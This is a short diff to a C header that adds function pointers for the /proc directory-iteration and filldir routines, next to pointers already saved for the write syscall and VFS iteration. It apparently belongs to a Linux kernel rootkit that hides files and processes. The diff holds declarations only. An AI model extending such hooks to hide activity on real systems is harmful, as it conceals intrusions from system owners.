@@ -22,4 +22,7 @@ asmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t co
 int (*vfs_original_iterate)(struct file *, struct dir_context *);
 int (*vfs_original_filldir)(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);
 
+int (*vfs_original_proc_iterate)(struct file *, struct dir_context *);
+int (*vfs_original_proc_filldir)(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);
+
 #endif /* _DUCK_H_ */
